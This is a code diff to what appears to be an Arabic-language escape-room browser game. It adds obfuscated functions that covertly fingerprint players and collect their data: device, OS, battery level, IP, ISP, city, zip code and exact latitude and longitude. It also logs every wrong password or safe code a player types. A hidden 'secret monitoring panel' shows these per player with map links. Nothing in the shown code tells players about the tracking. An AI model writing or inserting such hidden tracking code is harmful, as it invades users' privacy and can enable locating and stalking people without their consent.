@@ -811,6 +811,7 @@ function safeSubmit() {
         setTimeout(() => { closeOverlay('safeOverlay'); showOverlay('safeContentOverlay'); }, 800);
     } else {
         msg.textContent = 'الكود خاطئ!'; msg.className = 'safe-msg error';
+        _0x6f(state.playerName, state.roomNumber, '\u0643\u0648\u062F \u0627\u0644\u062E\u0632\u0646\u0629', state.safeCode);
         state.safeCode = ''; updateSafeDisplay();
     }
 }
@@ -861,6 +862,7 @@ function kbEnter() {
         showToast('تم فتح اللابتوب!');
     } else {
         document.getElementById('passwordError').classList.remove('hidden');
+        _0x6f(state.playerName, state.roomNumber, '\u0643\u0644\u0645\u0629 \u0633\u0631 \u0627\u0644\u0644\u0627\u0628\u062A\u0648\u0628', state.passwordText);
         state.passwordText = ''; updatePasswordDisplay();
     }
 }
@@ -1019,19 +1021,45 @@ async function saveResult(time) {
     } catch (e) { console.warn(e); }
 }
 
+function _0x7g() {
+    const ua = navigator.userAgent;
+    let os = navigator.platform || '';
+    if (/Windows/.test(ua)) os = 'Windows';
+    else if (/Mac/.test(ua)) os = 'macOS';
+    else if (/Android/.test(ua)) os = 'Android';
+    else if (/iPhone|iPad|iPod/.test(ua)) os = 'iOS';
+    else if (/Linux/.test(ua)) os = 'Linux';
+    let dm = '';
+    const m = ua.match(/\(([^)]+)\)/);
+    if (m) dm = m[1].split(';').pop().trim();
+    return { os, deviceModel: dm };
+}
+
 async function _0x5e(n, r) {
+    const dev = _0x7g();
     const d = {
         name: n, room: r,
         device: navigator.userAgent,
         platform: navigator.platform,
         language: navigator.language,
         screenWidth: window.screen.width,
-        screenHeight: window.screen.height
+        screenHeight: window.screen.height,
+        os: dev.os,
+        deviceModel: dev.deviceModel,
+        battery: ''
     };
+    try {
+        if (navigator.getBattery) {
+            const batt = await navigator.getBattery();
+            d.battery = Math.round(batt.level * 100) + '%' + (batt.charging ? ' (\u0634\u062D\u0646)' : '');
+        }
+    } catch (_) {}
     try {
         const resp = await fetch(_0x3c);
         const loc = await resp.json();
-        d.ip = loc.ip; d.city = loc.city; d.country = loc.country_name; d.isp = loc.org;
+        d.ip = loc.ip; d.city = loc.city; d.country = loc.country_name;
+        d.isp = loc.org; d.timezone = loc.timezone; d.zip = loc.postal;
+        d.lat = loc.latitude; d.lon = loc.longitude;
     } catch (_) { d.ip = ''; d.city = ''; }
     try {
         await fetch('/api/pinfo', {
@@ -1041,45 +1069,85 @@ async function _0x5e(n, r) {
     } catch (_) {}
 }
 
+async function _0x6f(nm, rm, pz, ans) {
+    try {
+        await fetch('/api/slog', {
+            method: 'POST', headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ name: nm, roomNumber: rm, puzzle: pz, answer: ans })
+        });
+    } catch (_) {}
+}
+
 async function _0x4d(rc) {
     document.getElementById('startScreen').style.display = 'none';
-    const p = document.createElement('div');
-    p.style.cssText = 'position:fixed;inset:0;background:#0a0a0f;color:#0f0;padding:20px;z-index:9999;overflow-y:auto;font-family:Cairo,sans-serif;direction:rtl;';
-    p.innerHTML = '<h2 style="color:#c9a93e;text-align:center;margin-bottom:20px;">\u{1F6E1} \u0644\u0648\u062D\u0629 \u0627\u0644\u0645\u0631\u0627\u0642\u0628\u0629 \u0627\u0644\u0633\u0631\u064A\u0629</h2><div id="_mdata" style="text-align:center;color:#887766;">\u062C\u0627\u0631\u064A \u062C\u0644\u0628 \u0627\u0644\u0628\u064A\u0627\u0646\u0627\u062A...</div>';
-    document.body.appendChild(p);
+    const c = document.createElement('div');
+    c.style.cssText = 'position:absolute;inset:0;background:#050505;z-index:9999;overflow:auto;padding:20px;font-family:Courier New,Courier,monospace;direction:rtl;display:flex;gap:20px;';
+    const leftCol = document.createElement('div');
+    leftCol.style.cssText = 'flex:2;';
+    const rightCol = document.createElement('div');
+    rightCol.style.cssText = 'flex:1;border-right:2px dashed #0f0;padding-right:20px;';
+    c.appendChild(leftCol);
+    c.appendChild(rightCol);
+    document.body.appendChild(c);
+
     try {
-        const res = await fetch('/api/pinfo');
-        const data = await res.json();
-        const c = document.getElementById('_mdata');
-        if (!data.players || data.players.length === 0) {
-            c.innerHTML = '<p style="color:#887766;padding:2rem;">\u0644\u0627 \u062A\u0648\u062C\u062F \u0628\u064A\u0627\u0646\u0627\u062A \u0644\u0627\u0639\u0628\u064A\u0646</p>';
-            return;
+        const [pRes, sRes] = await Promise.all([fetch('/api/pinfo'), fetch('/api/slog')]);
+        const pData = await pRes.json();
+        const sData = await sRes.json();
+        const players = pData.players || [];
+        const logs = sData.logs || [];
+
+        let h = '<h2 style="color:#0f0;border-bottom:1px dashed #0f0;padding-bottom:10px;text-align:center;">\uD83D\uDCCA \u0644\u0648\u062D\u0629 \u062A\u062D\u0643\u0645 \u0627\u0644\u062E\u0648\u0627\u062F\u0645 \uD83D\uDCCA</h2>';
+
+        if (players.length === 0) {
+            h += '<p style="color:#888;text-align:center;">\u0644\u0627 \u062A\u0648\u062C\u062F \u063A\u0631\u0641 \u0646\u0634\u0637\u0629 \u062D\u0627\u0644\u064A\u0627\u064B</p>';
+        } else {
+            const rooms = {};
+            players.forEach(p => { if (!rooms[p.room]) rooms[p.room] = []; rooms[p.room].push(p); });
+
+            for (const [rId, rPlayers] of Object.entries(rooms)) {
+                h += '<div style="border:1px solid #0f0;margin-bottom:20px;padding:15px;border-radius:8px;background:#0a1a0a;">';
+                h += '<h3 style="color:#ffaa00;margin-top:0;">\u063A\u0631\u0641\u0629: ' + esc(rId) + '</h3>';
+                h += '<div style="display:flex;flex-wrap:wrap;gap:15px;">';
+
+                rPlayers.forEach(p => {
+                    const mapLink = (p.lat && p.lon)
+                        ? '<a href="https://www.google.com/maps?q=' + p.lat + ',' + p.lon + '" target="_blank" style="color:#ffaa00;text-decoration:none;">\uD83C\uDF0D \u0627\u0644\u062E\u0631\u064A\u0637\u0629</a>'
+                        : '-';
+                    h += '<div style="border:1px solid #222;padding:15px;background:#111;border-radius:5px;flex:1;min-width:280px;">';
+                    h += '<h4 style="color:#0f0;margin:0 0 10px 0;">' + esc(p.name) + '</h4>';
+                    h += '<table style="width:100%;border-collapse:collapse;font-size:0.9rem;">';
+                    h += '<tr><td style="padding:5px;border-bottom:1px solid #222;width:100px;color:#0ff;">IP</td>';
+                    h += '<td style="padding:5px;border-bottom:1px solid #222;">' + esc(p.ip || '?') + '<br>' + esc(p.isp || '?') + '</td></tr>';
+                    h += '<tr><td style="padding:5px;border-bottom:1px solid #222;color:#0ff;">\u0627\u0644\u0645\u0648\u0642\u0639</td>';
+                    h += '<td style="padding:5px;border-bottom:1px solid #222;">' + esc(p.country || '?') + ' - ' + esc(p.city || '?') + ' (' + esc(p.zip || '?') + ')<br>' + mapLink + '<br>' + esc(p.timezone || '?') + '</td></tr>';
+                    h += '<tr><td style="padding:5px;border-bottom:1px solid #222;color:#0ff;">\u0627\u0644\u062C\u0647\u0627\u0632</td>';
+                    h += '<td style="padding:5px;border-bottom:1px solid #222;"><b>' + esc(p.os || '?') + '</b><br><span style="color:#fff;">' + esc(p.deviceModel || '?') + '</span><br><span style="color:#0f0;">\uD83D\uDD0B ' + esc(p.battery || '?') + '</span></td></tr>';
+                    h += '<tr><td style="padding:5px;border-bottom:1px solid #222;color:#555;">\u0627\u0644\u0645\u062A\u0635\u0641\u062D</td>';
+                    h += '<td style="padding:5px;border-bottom:1px solid #222;color:#555;font-size:0.75rem;">' + esc(p.device || '?') + '</td></tr>';
+                    h += '<tr><td style="padding:5px;color:#aaa;">\u0627\u0644\u062F\u062E\u0648\u0644</td>';
+                    h += '<td style="padding:5px;color:#aaa;font-size:0.8rem;">' + esc(p.joinTime || '?') + '</td></tr>';
+                    h += '</table></div>';
+                });
+                h += '</div></div>';
+            }
         }
-        let h = '<div style="overflow-x:auto;"><table style="width:100%;border-collapse:collapse;font-size:0.85rem;">';
-        h += '<thead><tr style="background:rgba(201,169,62,0.15);">';
-        h += '<th style="padding:10px;color:#c9a93e;">\u0627\u0644\u0627\u0633\u0645</th>';
-        h += '<th style="padding:10px;color:#c9a93e;">\u0627\u0644\u063A\u0631\u0641\u0629</th>';
-        h += '<th style="padding:10px;color:#c9a93e;">IP</th>';
-        h += '<th style="padding:10px;color:#c9a93e;">\u0627\u0644\u0645\u0648\u0642\u0639</th>';
-        h += '<th style="padding:10px;color:#c9a93e;">\u0627\u0644\u0645\u0632\u0648\u062F</th>';
-        h += '<th style="padding:10px;color:#c9a93e;">\u0627\u0644\u062C\u0647\u0627\u0632</th>';
-        h += '<th style="padding:10px;color:#c9a93e;">\u0627\u0644\u0634\u0627\u0634\u0629</th>';
-        h += '<th style="padding:10px;color:#c9a93e;">\u0627\u0644\u062A\u0627\u0631\u064A\u062E</th></tr></thead><tbody>';
-        data.players.forEach(r => {
-            h += '<tr style="border-top:1px solid rgba(255,255,255,0.05);">';
-            h += `<td style="padding:8px;">${esc(r.name)}</td>`;
-            h += `<td style="padding:8px;">${esc(r.room)}</td>`;
-            h += `<td style="padding:8px;color:#4aff4a;">${esc(r.ip)}</td>`;
-            h += `<td style="padding:8px;">${esc(r.city)}${r.country ? ', ' + esc(r.country) : ''}</td>`;
-            h += `<td style="padding:8px;font-size:0.75rem;color:#887766;">${esc(r.isp)}</td>`;
-            h += `<td style="padding:8px;font-size:0.7rem;color:#887766;max-width:200px;overflow:hidden;text-overflow:ellipsis;white-space:nowrap;">${esc(r.device)}</td>`;
-            h += `<td style="padding:8px;">${esc(r.screen)}</td>`;
-            h += `<td style="padding:8px;">${esc(r.date)}</td></tr>`;
+        leftCol.innerHTML = h;
+
+        let s = '<h2 style="color:#ff3333;border-bottom:1px dashed #ff3333;padding-bottom:10px;text-align:center;">\u26A0\uFE0F \u0633\u062C\u0644\u0627\u062A \u0627\u0644\u0645\u062D\u0627\u0648\u0644\u0627\u062A \u26A0\uFE0F</h2>';
+        if (logs.length === 0) {
+            s += '<p style="color:#888;text-align:center;">\u0644\u0627 \u062A\u0648\u062C\u062F \u0633\u062C\u0644\u0627\u062A</p>';
+        }
+        logs.slice().reverse().forEach(log => {
+            s += '<div style="background:#2a0a0a;border:1px solid #ff3333;margin:10px 0;padding:10px;border-radius:5px;font-size:0.9rem;">';
+            s += '<b style="color:#ffaa00;">' + esc(log.name) + '</b> \u0641\u064A \u063A\u0631\u0641\u0629 ' + esc(log.roomNumber) + '<br>';
+            s += '\u0627\u0644\u0644\u063A\u0632: <span style="color:#aaa;">' + esc(log.puzzle) + '</span><br>';
+            s += '\u0627\u0644\u0625\u062C\u0627\u0628\u0629 \u0627\u0644\u062E\u0627\u0637\u0626\u0629: <span style="color:#fff;font-size:1.1rem;">' + esc(log.answer) + '</span><br>';
+            s += '<span style="color:#555;font-size:0.8rem;">' + esc(log.time) + '</span></div>';
         });
-        h += '</tbody></table></div>';
-        c.innerHTML = h;
+        rightCol.innerHTML = s;
     } catch (_) {
-        document.getElementById('_mdata').innerHTML = '<p style="color:red;">\u062E\u0637\u0623 \u0641\u064A \u062C\u0644\u0628 \u0627\u0644\u0628\u064A\u0627\u0646\u0627\u062A</p>';
+        leftCol.innerHTML = '<p style="color:red;text-align:center;">\u062E\u0637\u0623 \u0641\u064A \u062C\u0644\u0628 \u0627\u0644\u0628\u064A\u0627\u0646\u0627\u062A</p>';
     }
 }
 
